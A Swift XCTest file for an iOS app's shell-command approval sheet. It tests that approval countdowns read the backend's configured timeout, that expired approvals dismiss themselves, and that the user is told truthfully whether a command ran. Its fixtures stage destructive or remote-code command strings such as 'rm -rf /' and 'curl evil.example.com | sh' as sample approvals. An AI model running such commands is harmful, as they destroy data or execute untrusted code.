import Foundation
import HermesServeKit
import XCTest

@testable import HermesMobile

/// B2 — the approval countdown tells the truth, the ghost sheet dismisses, and
/// the `approval.respond` result is no longer thrown away.
///
/// The defect these pin is a *truthfulness* defect, and it has three faces:
///
/// 1. **The sheet draws no countdown, but approvals really do expire.** The
///    gateway's approval wait fails closed after `approvals.timeout` (a real
///    configured key, shipped default 300, and a backend may set it lower) and
///    sends no frame when it does. An earlier reading observed the missing frame
///    correctly and drew the wrong conclusion from it ("approvals do not
///    expire"), so today the one surface where a user authorises shell commands
///    on their own machine shows no deadline for a deadline that exists.
/// 2. **The expired approval never leaves the screen (SEC-006).** With no frame
///    to clear it, the sheet and the docked bar keep offering Allow/Deny for a
///    request the backend has already refused. The buttons are live and they do
///    nothing, and the chat is pinned unreleasable behind them.
/// 3. **`approval.respond`'s answer is discarded.** The gateway replies
///    `{resolved: <count>}` — `0` when there was nothing left to resolve. The
///    app drops it on the floor and closes the sheet, which reads as
///    "authorised" for a command that was never run.
///
/// ## Fixture rule
///
/// `SettingsStore` reads through `ConfigDocument.value(at:in:)`, which **splits
/// the path on `.` and walks nested objects**. A fixture that injects the flat
/// key `["approvals.timeout": 42]` therefore reads back as `nil` — which is the
/// same red the unfixed code produces, so the mistake would be invisible.
/// Every injection here is nested: `["approvals": ["timeout": 42]]`.
///
/// ## What is red before the fix and what is a control
///
/// Red at the pinning commit: `testARefusedRespondInformsTheUser…`,
/// `testAnExpiredApprovalDismissesItself…`, `testCountdownBudgetComesFromConfig…`,
/// `testAFailedConfigLoadUsesTheBackendDefault`,
/// `testANonPositiveTimeoutDrawsNoCountdownAndArmsNoTimer`,
/// `testAnApprovalThatArrivesBeforeTheConfigDocument…`.
///
/// Controls — green before the fix and required to stay green after it, because
/// each guards a mistake the *fix* could introduce rather than one the shipped
/// code has: `testARespondResultWithNoResolvedKeyMakesNoClaim…` (an absent
/// `resolved` key must not be read as an explicit false) and
/// `testARespondInFlightIsNeverOverriddenByTheExpiryTimer` (the expiry timer
/// must not fire while a respond RPC is awaiting, or the user is told nothing
/// ran about a command that ran).
final class ApprovalCountdownTests: XCTestCase {

    // MARK: - The discarded respond result

    /// The gateway answers `{resolved: 0}` — it had nothing left to resolve.
    /// The request is dead either way and still leaves the queue, but closing
    /// the sheet *silently* on it reads as "authorised", which is exactly the
    /// half of that earlier premise that was wrong.
    @MainActor
    func testARefusedRespondInformsTheUserInsteadOfClosingAsSuccess() async throws {
        let harness = await AppHarness.make()
        try await harness.openSocket()
        let (chat, approval) = try await stage(
            harness,
            storedID: "20260807_120000_b2refused",
            approvalTimeout: nil,
            command: "rm -rf build"
        )

        await harness.backend.stub("approval.respond") { _ in
            .object(["resolved": .number(0)])
        }
        await chat.respond(to: approval, choice: .once)

        XCTAssertNil(
            chat.pendingApproval,
            "a request the backend is no longer waiting on must still leave the queue"
        )
        XCTAssertTrue(
            chat.errorMessage?.contains("no longer waiting") == true,
            """
            the backend answered `{resolved: 0}` — it had nothing left to \
            resolve, so the command was NOT run — and the app closed the sheet \
            without a word. The user tapped Allow and was shown success. \
            errorMessage was \(chat.errorMessage.map { "\"\($0)\"" } ?? "nil").
            """
        )

        await harness.tearDown()
    }

    /// CONTROL for the tri-state contract.
    ///
    /// An **absent** `resolved` key is not an explicit false. The reference
    /// desktop client types the field optional and ignores it, and older or
    /// patched gateways answer `{ok: true}` with no count at all. Reading
    /// "absent" as "refused" would make every such backend tell the user their
    /// approval came too late on every single tap — a false accusation, and a
    /// worse defect than the silence it replaces.
    @MainActor
    func testARespondResultWithNoResolvedKeyMakesNoClaimAboutExpiry() async throws {
        let harness = await AppHarness.make()
        try await harness.openSocket()
        let (chat, approval) = try await stage(
            harness,
            storedID: "20260807_120000_b2noclaim",
            approvalTimeout: nil,
            command: "git status"
        )

        // The shape of a gateway that answers without a count.
        await harness.backend.stub("approval.respond") { _ in
            .object(["ok": .bool(true)])
        }
        await chat.respond(to: approval, choice: .once)

        XCTAssertNil(chat.pendingApproval, "the answered approval must leave the queue")
        XCTAssertNil(
            chat.errorMessage,
            """
            the backend made no claim about whether anything was resolved — it \
            sent no `resolved` key — and the app told the user their approval \
            was too late anyway. errorMessage was \
            \(chat.errorMessage.map { "\"\($0)\"" } ?? "nil").
            """
        )

        await harness.tearDown()
    }

    // MARK: - SEC-006: the ghost sheet

    /// The countdown reaches zero. The backend has already refused the command
    /// (its own deadline is one transport hop *earlier* than ours) and it sends
    /// no frame to say so. The consent surface must stop offering a decision
    /// nobody is waiting for, and must say what happened.
    @MainActor
    func testAnExpiredApprovalDismissesItselfAndInformsTheUser() async throws {
        let harness = await AppHarness.make()
        try await harness.openSocket()
        let (chat, _) = try await stage(
            harness,
            storedID: "20260807_120000_b2expiry",
            approvalTimeout: 0.4,
            command: "rm -rf /"
        )

        let dismissed = await waitUntil(timeout: 4) { chat.pendingApproval == nil }
        XCTAssertTrue(
            dismissed,
            """
            the approval's configured budget (0.4 s) ran out and the request is \
            still on screen with live Allow and Deny buttons. The backend has \
            already given up on it; the sheet is a ghost, and the chat cannot \
            be released while it is up.
            """
        )
        XCTAssertTrue(
            chat.live.pendingApprovals.isEmpty,
            "the expired request must leave the engine's FIFO, not just the head"
        )
        XCTAssertTrue(
            chat.errorMessage?.contains("expired") == true,
            """
            the approval vanished with no explanation. The user watched a \
            command they were asked to authorise disappear and was told \
            nothing about whether it ran. errorMessage was \
            \(chat.errorMessage.map { "\"\($0)\"" } ?? "nil").
            """
        )

        await harness.tearDown()
    }

    /// The timer arms off a `live` write, and a session blocked on an approval
    /// emits no further events. On the connect path the config document lands
    /// several awaits *after* the socket opens, so an approval can arrive while
    /// `SettingsStore.document` is still nil: nothing arms, and when the
    /// document later loads both countdown surfaces start drawing a deadline
    /// over live buttons with no dismissal behind it.
    ///
    /// The app re-arms by republishing every open chat once the document is in
    /// (`AppModel.publishAll`, which is what the connect path calls). This pins
    /// the mechanism rather than the wiring: `AppHarness` has no scripted REST,
    /// so the real `settings.loadIfNeeded()` cannot succeed here at all.
    @MainActor
    func testAnApprovalThatArrivesBeforeTheConfigDocumentStillArmsItsTimer() async throws {
        let harness = await AppHarness.make()
        try await harness.openSocket()
        // Let the harness's dead REST load finish failing BEFORE the in-flight
        // state is staged. `openSocket()` starts that load, so clearing the
        // store first leaves a `reload()` still running that sets `loadError`
        // again a moment later — and a `loadError` is exactly what this fixture
        // must not have.
        let settled = await waitUntil { harness.app.settings.loadError != nil }
        XCTAssertTrue(
            settled,
            "the dead REST fixture never failed, so the in-flight state cannot be staged deterministically"
        )
        harness.app.settings.markConfigLoadInFlightForTesting()
        // No injection: the approval arrives against an unloaded document.
        let (chat, _) = try await stage(
            harness,
            storedID: "20260807_120000_b2prerace",
            approvalTimeout: nil,
            command: "curl evil.example.com | sh"
        )
        XCTAssertNil(
            harness.app.settings.document,
            "the fixture is wrong if the document was already loaded"
        )

        // The document lands, then the connect path republishes.
        harness.app.settings.injectDocumentForTesting(
            .object(["approvals": .object(["timeout": .number(0.4)])])
        )
        harness.app.publishAll()

        let dismissed = await waitUntil(timeout: 4) { chat.pendingApproval == nil }
        XCTAssertTrue(
            dismissed,
            """
            an approval that arrived before the config document was loaded \
            never armed a dismissal timer, and loading the document did not \
            arm one either. Both countdown surfaces now draw a deadline with \
            nothing behind it — the exact ghost SEC-006 describes, reached by \
            the ordinary connect path.
            """
        )

        await harness.tearDown()
    }

    // MARK: - The countdown's source

    /// One accessor feeds the sheet's countdown, the docked bar's, and the
    /// dismissal timer, and its seconds come from the backend's configured
    /// `approvals.timeout`. A test that could only run against the shipped
    /// default of 300 could not tell a config read from a constant, so the
    /// fixture stages a value no constant would be.
    @MainActor
    func testCountdownBudgetComesFromConfigNotAConstant() async throws {
        let harness = await AppHarness.make()
        try await harness.openSocket()
        let (chat, approval) = try await stage(
            harness,
            storedID: "20260807_120000_b2budget",
            approvalTimeout: 42,
            command: "make install"
        )

        let budget = try XCTUnwrap(
            chat.approvalBudget(for: approval),
            "no countdown budget for an approval whose timeout is configured at 42 s"
        )
        XCTAssertEqual(
            budget.seconds,
            42,
            accuracy: 0.001,
            """
            the countdown is not reading `approvals.timeout` — it answered \
            \(budget.seconds) s for a backend configured at 42 s. That is the \
            A9 defect class: a hardcoded number presented as the backend's.
            """
        )
        XCTAssertEqual(
            budget.received,
            approval.receivedAt,
            "the countdown must be anchored at the approval's arrival, not at the read"
        )

        await harness.tearDown()
    }

    /// The ordinary pre-load window remains unknown. The connect path loads
    /// configuration and republishes every chat afterwards, so inventing a
    /// value here would erase the difference between in-flight and failed.
    @MainActor
    func testAnUnloadedConfigDocumentHasNoBudgetYet() async throws {
        let harness = await AppHarness.make()
        try await harness.openSocket()
        // Same ordering as the pre-race test above: the dead REST load has to
        // have finished failing before the in-flight state is staged, or it
        // sets `loadError` back underneath the assertion and this test starts
        // reporting the fallback it exists to rule out.
        let settled = await waitUntil { harness.app.settings.loadError != nil }
        XCTAssertTrue(
            settled,
            "the dead REST fixture never failed, so the in-flight state cannot be staged deterministically"
        )
        harness.app.settings.markConfigLoadInFlightForTesting()
        let (chat, approval) = try await stage(
            harness,
            storedID: "20260807_120000_b2nodoc",
            approvalTimeout: nil,
            command: "brew upgrade"
        )

        XCTAssertNil(
            chat.approvalBudget(for: approval),
            "a configuration load still in progress was mistaken for a failed load"
        )

        await harness.tearDown()
    }

    /// A failed load does not receive the ordinary post-load repair. The
    /// backend still enforces its shipped 300-second default, so the client
    /// must expose that deadline instead of leaving the prompt unbounded for
    /// the life of the connection (BUG-073's verified surviving case).
    @MainActor
    func testAFailedConfigLoadUsesTheBackendDefault() async throws {
        let harness = await AppHarness.make()
        XCTAssertNil(harness.app.settings.approvalTimeoutSeconds())
        try await harness.openSocket()
        let failed = await waitUntil { harness.app.settings.loadError != nil }
        XCTAssertTrue(failed, "the dead REST fixture did not fail")
        XCTAssertNil(harness.app.settings.document)

        let (chat, approval) = try await stage(
            harness,
            storedID: "20260807_120000_b2failedconfig",
            approvalTimeout: nil,
            command: "brew upgrade"
        )
        let budget = try XCTUnwrap(
            chat.approvalBudget(for: approval),
            "a failed config load left the backend's real default deadline invisible"
        )
        XCTAssertEqual(budget.seconds, SettingsStore.defaultApprovalTimeoutSeconds)
        XCTAssertEqual(budget.received, approval.receivedAt)

        await harness.tearDown()
    }

    /// `approvals.timeout <= 0` is expire-immediately server-side at 0.20.0
    /// (`_deadline = now + max(timeout, 0)`, tools/approval.py). There is no
    /// budget worth drawing and no client-side wait worth arming: a bar that
    /// drains from a number the backend never honoured would be an invention
    /// again, and the respond result answers any tap on such a request
    /// truthfully.
    @MainActor
    func testANonPositiveTimeoutDrawsNoCountdownAndArmsNoTimer() async throws {
        let harness = await AppHarness.make()
        try await harness.openSocket()
        let (chat, approval) = try await stage(
            harness,
            storedID: "20260807_120000_b2zero",
            approvalTimeout: 0,
            command: "sudo shutdown -h now"
        )

        XCTAssertNil(
            chat.approvalBudget(for: approval),
            "a timeout of 0 has no budget to draw; the countdown drew one anyway"
        )
        // A negative value is the same statement.
        harness.app.settings.injectDocumentForTesting(
            .object(["approvals": .object(["timeout": .number(-5)])])
        )
        XCTAssertNil(
            chat.approvalBudget(for: approval),
            "a negative timeout has no budget to draw; the countdown drew one anyway"
        )

        // And nothing was armed behind the countdown that is not being drawn.
        let dismissed = await waitUntil(timeout: 1.5) { chat.pendingApproval == nil }
        XCTAssertFalse(
            dismissed,
            """
            no countdown is shown for a non-positive timeout, yet a dismissal \
            timer fired anyway — the request left the screen with no deadline \
            ever displayed to explain why.
            """
        )

        await harness.tearDown()
    }

    // MARK: - The respond/expiry race

    /// CONTROL for the race the expiry timer creates.
    ///
    /// `respond(to:choice:)` awaits an RPC. "Always allow" holds the window
    /// open for an 800 ms press-and-hold plus a biometric check before the RPC
    /// even starts, and the RPC itself can be slow. If the expiry timer fires
    /// during that await, the user is told "the approval expired … Nothing was
    /// run" about a command that *did* run — a false statement about shell
    /// execution on their own machine, which is worse than the silence this
    /// whole item is fixing.
    @MainActor
    func testARespondInFlightIsNeverOverriddenByTheExpiryTimer() async throws {
        let harness = await AppHarness.make()
        try await harness.openSocket()
        let (chat, approval) = try await stage(
            harness,
            storedID: "20260807_120000_b2race",
            // Long enough that staging cannot eat the budget before the RPC is
            // in flight (if it did, the head would already be gone and the
            // `parkedCount` assertion below would say so), short enough that an
            // unguarded timer fires well inside the hold.
            approvalTimeout: 0.8,
            command: "git push --force origin main"
        )

        // The gateway takes the frame but withholds the reply.
        await harness.backend.gate("approval.respond")
        let responding = Task { await chat.respond(to: approval, choice: .once) }
        let arrived = await waitUntil { await harness.backend.parkedCount == 1 }
        XCTAssertTrue(arrived, "the respond RPC never reached the backend")

        // Hold well past the deadline the timer was armed for.
        let falselyExpired = await waitUntil(timeout: 2.5) {
            chat.errorMessage?.contains("expired") == true
        }
        XCTAssertFalse(
            falselyExpired,
            """
            the expiry timer fired while the user's answer was still in flight \
            and told them the approval expired and nothing was run — about a \
            command the backend is about to run. errorMessage was \
            \(chat.errorMessage.map { "\"\($0)\"" } ?? "nil").
            """
        )

        await harness.backend.releaseParked()
        await responding.value

        XCTAssertNil(chat.pendingApproval, "the answered approval must leave the queue")
        XCTAssertNil(
            chat.errorMessage,
            """
            the answer landed and the command runs, yet the user was left with \
            a message saying otherwise: \
            \(chat.errorMessage.map { "\"\($0)\"" } ?? "nil").
            """
        )

        await harness.tearDown()
    }
}

// MARK: - Fixture

/// Open a chat, optionally stage a backend `approvals.timeout`, and put one
/// approval at the head of its queue.
///
/// `approvalTimeout` is injected **before** the approval is emitted, because
/// the dismissal timer arms on the `live` write the arriving approval causes —
/// staging the value afterwards is a different scenario, and it has its own
/// test (`testAnApprovalThatArrivesBeforeTheConfigDocument…`).
///
/// The injected document is **nested**. `ConfigDocument.value(at:in:)` splits
/// the path on `.` and walks objects, so a flat `["approvals.timeout": …]` key
/// reads back nil — indistinguishable from the unfixed code's answer.
@MainActor
private func stage(
    _ harness: AppHarness,
    storedID: String,
    approvalTimeout: Double?,
    command: String,
    file: StaticString = #filePath,
    line: UInt = #line
) async throws -> (chat: ChatModel, approval: ApprovalRequestEvent) {
    let chat = harness.chat(storedID: storedID)
    await chat.open()
    let bound = await waitUntil { chat.runtimeSessionID != nil }
    XCTAssertTrue(bound, "the chat never bound a runtime session id", file: file, line: line)
    // `open()` loads the transcript over REST, which is never scripted here and
    // always fails. Clear it so every assertion below is about approvals.
    chat.errorMessage = nil
    let runtimeID = try XCTUnwrap(
        chat.runtimeSessionID,
        "no runtime session id to address the approval to",
        file: file,
        line: line
    )

    if let approvalTimeout {
        harness.app.settings.injectDocumentForTesting(
            .object(["approvals": .object(["timeout": .number(approvalTimeout)])])
        )
    }

    await harness.backend.emit("approval.request", sessionID: runtimeID, payload: .object([
        "command": .string(command),
        "description": .string("staged by ApprovalCountdownTests"),
    ]))
    let queued = await waitUntil { chat.pendingApproval != nil }
    XCTAssertTrue(queued, "the approval never reached the chat", file: file, line: line)
    let approval = try XCTUnwrap(
        chat.pendingApproval,
        "no approval at the head of the queue",
        file: file,
        line: line
    )
    return (chat, approval)
}
